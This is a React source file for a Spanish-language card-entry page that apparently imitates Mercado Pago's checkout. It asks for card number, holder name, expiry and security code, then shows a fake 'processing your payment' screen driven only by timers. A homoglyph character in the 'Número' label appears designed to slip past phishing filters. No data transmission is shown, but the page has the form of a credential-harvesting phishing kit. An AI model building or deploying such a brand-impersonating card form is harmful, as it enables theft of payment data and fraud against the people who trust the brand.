import React, { useEffect, useState } from "react";
import immg from "../imgs/Screenshot_6.png";

const LoadingIndicator = () => {
  return (
    <div className="fixed top-0 left-0 w-full h-full flex justify-center items-center bg-[#eeeeee]">
      <div
        class="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-current border-e-transparent align-[-0.125em] text-surface motion-reduce:animate-[spin_1.5s_linear_infinite] dark:text-slate-300"
        role="status"
      >
        <span class="!absolute !-m-px !h-px !w-px !overflow-hidden !whitespace-nowrap !border-0 !p-0 ![clip:rect(0,0,0,0)]">
          Loading...
        </span>
      </div>
    </div>
  );
};

const AnotherComponent = () => {
  return (
    <div className="fixed top-0 left-0 w-full h-full flex justify-center items-center bg-[#eeeeee]">
      {/* Tres cuartos superiores naranjas */}
      <div className="absolute top-0 left-0 w-full h-80 bg-[#ff7434] flex justify-center items-center">
        <div className="text-white text-2xl font-bold">
          <div className=" flex justify-center mt-5 items-center">
            {" "}
            <img
              src={immg}
              className="w-28 h-28 flex justify-center items-center"
            />
          </div>
          <h2 className="flex justify-center font-proxima text-base font-light">
            ¡Ya casi es tuya!
          </h2>
          <br />
          <span className="font-proxima">Estamos procesando</span> <br />
          <div className=" flex justify-center font-proxima">tu pago</div>
        </div>
      </div>

      {/* Cuarto inferior */}
      <div className="text-slate-400 font-extralight text-xl mt-24 font-proxima text-center">
        Dentro de las próximas 24 horas te <br /> avisaremos si se acreditó
        <div className="absolute top-4 text-gray-200 text-2xl font-bold left-4">
          <a
            href="https://www.mercadopago.com.ar/"
            type="button"
            class=" rounded-md p-2 inline-flex items-center justify-center text-gray-200 hover:text-gray-300   "
          >
            <span class="sr-only">Close menu</span>
            <svg
              class="h-6 w-6"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              aria-hidden="true"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </a>
        </div>
      </div>
    </div>
  );
};

const Select = () => {
  const [cardNumber, setCardNumber] = useState("");
  const [cardMargin, setCardMargin] = useState(0);
  const [cardHolderName, setCardHolderName] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [expiration, setExpiration] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showAnotherComponent, setShowAnotherComponent] = useState(false);

  const handleChange = (event) => {
    const input = event.target.value;
    const formattedInput = formatCardNumber(input);

    function formatCardNumber(input) {
      let cardNumber = input.replace(/\D/g, "");
      cardNumber = cardNumber.replace(/(.{4})/g, "$1 ").trim();
      return cardNumber.slice(0, 32);
    }

    setCardNumber(formattedInput);
  };

  const handleContinueClick = () => {
    setTimeout(() => {
      setIsLoading(true);
    }, 2000);
    setTimeout(() => {
      setIsLoading(false);
      setShowAnotherComponent(true);
      console.log("Ocultar spinner...");
    }, 6000); // Ocultar el spinner después de 3 segundos
  };

  useEffect(() => {
    const handleResize = () => {
      const vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty("--vh", `${vh}px`);
    };

    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const hideOnLoading = isLoading ? "hidden" : "";
  const hideOnShow = showAnotherComponent ? "hidden" : "";

  useEffect(() => {
    const handleKeyboardShow = () => {
      setCardMargin(-100);
    };

    const handleKeyboardHide = () => {
      setCardMargin(0);
    };

    window.addEventListener("resize", handleKeyboardShow);
    window.addEventListener("resize", handleKeyboardHide);

    return () => {
      window.removeEventListener("resize", handleKeyboardShow);
      window.removeEventListener("resize", handleKeyboardHide);
    };
  }, []);

  return (
    <div className="flex justify-center bg-[#eeeeee]">
      <div className="flex justify-center items-center mb-[58px] bg-[#eeeeee]">
        <h1 className="text-sm font-medium text-slate-900 absolute top-[166px] ">
          Completá los datos de tu tarjeta
        </h1>
        <div
          className="w-full sm:w-auto px-8 py-3 mx-2 mt-16 bg-white rounded-md relative shadow-md"
          style={{ marginBottom: `${cardMargin}vh` }}
        >
          {isLoading ? (
            <LoadingIndicator />
          ) : (
            <>
              {showAnotherComponent && <AnotherComponent />}
              <div className="flex flex-col mb-4">
                <label className="block text-xs font-medium text-slate-800 mb-1 label-cosita">
                  Núm𝐞ro de tarjeta
                </label>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={handleChange}
                  maxLength={19}
                  className="w-72 text-xs font-semibold px-3 py-2  border border-gray-400 rounded focus:border-blue-400 focus:ring-1 focus:ring-blue-400 input"
                  placeholder="1234 1234 1234 1234"
                />
              </div>
              <div className="flex flex-col mb-4">
                <label className="block text-xs font-medium text-slate-800 mb-1 label-cosita">
                  Nombre del titular
                </label>
                <input
                  type="text"
                  placeholder="Ej .: María Lopez"
                  maxLength={32}
                  value={cardHolderName}
                  onChange={(event) => setCardHolderName(event.target.value)}
                  className="w-full px-3 text-xs font-semibold  py-2 border border-gray-400 rounded focus:border-blue-400 focus:ring-1 focus:ring-blue-400 input"
                  onKeyPress={(event) => {
                    const charCode = event.which ? event.which : event.keyCode;
                    if (
                      (charCode < 65 || charCode > 90) &&
                      (charCode < 97 || charCode > 122) &&
                      charCode !== 32 &&
                      charCode !== 8
                    ) {
                      event.preventDefault();
                    }
                  }}
                />
              </div>

              <div className="flex flex-col mb-4">
                <label className="block text-xs font-medium text-slate-800 mb-1 label-cosita">
                  Vencimiento
                </label>
                <input
                  type="text"
                  value={expiration}
                  onChange={(event) => {
                    let inputValue = event.target.value;
                    // Eliminamos cualquier caracter que no sea un número o una barra
                    inputValue = inputValue.replace(/[^\d/]/g, "");
                    // Limitamos la longitud máxima a 7 caracteres
                    inputValue = inputValue.slice(0, 7);
                    // Formateamos el texto para que coincida con el formato deseado
                    if (
                      inputValue.length === 3 &&
                      inputValue.indexOf("/") === -1
                    ) {
                      inputValue =
                        inputValue.slice(0, 2) + "/" + inputValue.slice(2);
                    }
                    setExpiration(inputValue);
                  }}
                  placeholder="MM/AAAA"
                  className="w-full px-3 text-xs font-semibold py-2  border border-gray-400 rounded focus:border-blue-400 focus:ring-1 focus:ring-blue-400 input"
                />
              </div>

              <div className="flex flex-col mb-4">
                <label className="block text-xs font-medium text-slate-800 mb-1 label-cosita">
                  Código de seguridad
                </label>
                <input
                  type="text"
                  value={securityCode}
                  onChange={(event) => {
                    let inputValue = event.target.value;
                    // Eliminamos cualquier caracter que no sea un número
                    inputValue = inputValue.replace(/\D/g, "");
                    // Limitamos la longitud máxima a 3 caracteres
                    inputValue = inputValue.slice(0, 3);
                    setSecurityCode(inputValue);
                  }}
                  placeholder="123"
                  maxLength={3}
                  className="w-full px-3 text-xs font-semibold py-2 border border-gray-400 rounded focus:border-blue-400 focus:ring-1 focus:ring-blue-400 input"
                />
              </div>

              <div className="flex flex-col">
                <button
                  className="px-12 py-2 font-semibold text-white bg-[#009ee3] rounded"
                  onClick={handleContinueClick}
                >
                  Continuar
                </button>
                <button className="px-4 py-2 mt-2 font-semibold text-white bg-[#d6e2ea] rounded mb-1">
                  <span className="text-[#009ee3]">Volver</span>
                </button>
              </div>
            </>
          )}
        </div>
      </div>
      <div
        className={`absolute top-[452px] right-16 md:right-64 ${hideOnLoading} ${hideOnShow}`}
      >
        <svg
          width="25"
          height="25"
          viewBox="0 0 25 25"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="icon-card-cvv-grey"
        >
          <path
            fillRule="evenodd"
            clipRule="evenodd"
            d="M20.25 4.99658H2.25C1.00736 4.99658 0 6.00394 0 7.24658V17.7474C0 18.99 1.00736 19.9974 2.25 19.9974H20.25C21.4926 19.9974 22.5 18.99 22.5 17.7474V7.24658C22.5 6.00394 21.4926 4.99658 20.25 4.99658ZM1.5 17.7474V11.0083H21V17.7474C21 18.1616 20.6642 18.4974 20.25 18.4974H2.25C1.83579 18.4974 1.5 18.1616 1.5 17.7474ZM1.5 9.50832H21V7.24658C21 6.83237 20.6642 6.49658 20.25 6.49658H2.25C1.83579 6.49658 1.5 6.83237 1.5 7.24658V9.50832Z"
            fill="black"
            fillOpacity="0.25"
          ></path>
          <rect
            x="7.5"
            y="3.75"
            width="17.5"
            height="11.25"
            rx="2"
            fill="#737373"
          ></rect>
          <path
            d="M12.1223 10.36L12.1723 9.21L11.2123 9.84L10.9923 9.44L12.0123 8.92L10.9923 8.4L11.2123 8.01L12.1723 8.63L12.1223 7.48H12.5823L12.5223 8.63L13.4823 8.01L13.7123 8.4L12.6923 8.92L13.7123 9.44L13.4823 9.84L12.5223 9.21L12.5823 10.36H12.1223ZM16.0208 10.36L16.0708 9.21L15.1108 9.84L14.8908 9.44L15.9108 8.92L14.8908 8.4L15.1108 8.01L16.0708 8.63L16.0208 7.48H16.4808L16.4208 8.63L17.3808 8.01L17.6108 8.4L16.5908 8.92L17.6108 9.44L17.3808 9.84L16.4208 9.21L16.4808 10.36H16.0208ZM19.9192 10.36L19.9692 9.21L19.0092 9.84L18.7892 9.44L19.8092 8.92L18.7892 8.4L19.0092 8.01L19.9692 8.63L19.9192 7.48H20.3792L20.3192 8.63L21.2792 8.01L21.5092 8.4L20.4892 8.92L21.5092 9.44L21.2792 9.84L20.3192 9.21L20.3792 10.36H19.9192Z"
            fill="white"
          ></path>
        </svg>
      </div>
      <div
        className={`absolute top-[247px] right-16 md:right-64 ${hideOnLoading}  ${hideOnShow}`}
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="20"
          height="20"
          fill="none"
          viewBox="0 0 20 20"
        >
          <path
            fill="#000"
            fillOpacity="0.55"
            d="M8.199 13.001l-4.204-.007.002-1.2 4.204.007-.002 1.2z"
          ></path>
          <path
            fill="#000"
            fillOpacity="0.55"
            fillRule="evenodd"
            d="M17.2 3.997H2.8a1.8 1.8 0 00-1.8 1.8v8.4a1.8 1.8 0 001.8 1.8h14.4a1.8 1.8 0 001.8-1.8v-8.4a1.8 1.8 0 00-1.8-1.8zm-15 10.2v-5.39h15.6v5.39a.6.6 0 01-.6.6H2.8a.6.6 0 01-.6-.6zm0-6.59h15.6v-1.81a.6.6 0 00-.6-.6H2.8a.6.6 0 00-.6.6v1.81z"
            clipRule="evenodd"
          ></path>
        </svg>
      </div>
    </div>
  );
};

export default Select;
